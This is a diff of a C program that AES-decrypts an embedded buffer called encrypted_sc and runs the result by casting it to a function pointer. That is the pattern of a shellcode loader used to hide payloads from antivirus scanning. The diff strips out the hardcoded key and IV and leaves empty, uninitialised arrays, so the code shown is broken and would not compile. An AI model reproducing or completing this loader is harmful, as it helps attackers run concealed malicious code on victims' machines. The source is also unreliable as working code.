@@ -6,19 +6,16 @@
 #include <openssl/err.h>
 #include <string.h>
 
-int encrypt(const unsigned char encrypted_sc[], int plaintext_len, const unsigned char key[], const unsigned char iv[], unsigned char ciphertext[]);
 int decrypt(const unsigned char ciphertext[], int ciphertext_len, const unsigned char key[], const unsigned char iv[], unsigned char encrypted_sc[]);
 void print_data(const void* data, int len);
 
 int main (void) {
-    const static unsigned char key[] = {0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32,0x23,0x32};
+    const static unsigned char key[];
     unsigned char iv[AES_BLOCK_SIZE];
-    memset(iv, 0x46, AES_BLOCK_SIZE);
 
     /* when doing sizeof(encrypted_sc), subtract 1 to get the real (without null terminator) size */
-    const unsigned char encrypted_sc[];
-    int actual_input_size = sizeof(encrypted_sc) - 1;
-    print_data(encrypted_sc, actual_input_size);
+    unsigned char encrypted_sc[];
+    int actual_input_size = sizeof(encrypted_sc);
 
     int full = actual_input_size - (actual_input_size % AES_BLOCK_SIZE);
     int remainder = actual_input_size - full;
@@ -27,14 +24,13 @@ int main (void) {
     unsigned char decryptedtext[buffer_size * 8];
 
     int decryptedtext_len = decrypt(encrypted_sc, actual_input_size, key, iv, decryptedtext);
-
     int (*ret)() = (int(*)())decryptedtext;
     ret();
 
     return 0;
 }
 
-void handleErrors(void) {
+void handle_errors(void) {
     ERR_print_errors_fp(stderr);
     abort();
 }
@@ -46,7 +42,7 @@ int decrypt(const unsigned char ciphertext[], int ciphertext_len, const unsigned
 
     /* Create and initialise the context */
     if(!(ctx = EVP_CIPHER_CTX_new()))
-        handleErrors();
+        handle_errors();
 
     /*
      * Initialise the decryption operation. IMPORTANT - ensure you use a key
@@ -56,14 +52,14 @@ int decrypt(const unsigned char ciphertext[], int ciphertext_len, const unsigned
      * is 128 bits
      */
     if(1 != EVP_DecryptInit_ex(ctx, EVP_aes_256_cbc(), NULL, key, iv))
-        handleErrors();
+        handle_errors();
 
     /*
      * Provide the message to be decrypted, and obtain the encrypted_sc output.
      * EVP_DecryptUpdate can be called multiple times if necessary.
      */
     if(1 != EVP_DecryptUpdate(ctx, encrypted_sc, &len, ciphertext, ciphertext_len))
-        handleErrors();
+        handle_errors();
     encrypted_sc_len = len;
 
     /*
@@ -71,7 +67,7 @@ int decrypt(const unsigned char ciphertext[], int ciphertext_len, const unsigned
      * this stage.
      */
     if(1 != EVP_DecryptFinal_ex(ctx, encrypted_sc + len, &len))
-        handleErrors();
+        handle_errors();
     encrypted_sc_len += len;
 
     /* Clean up */
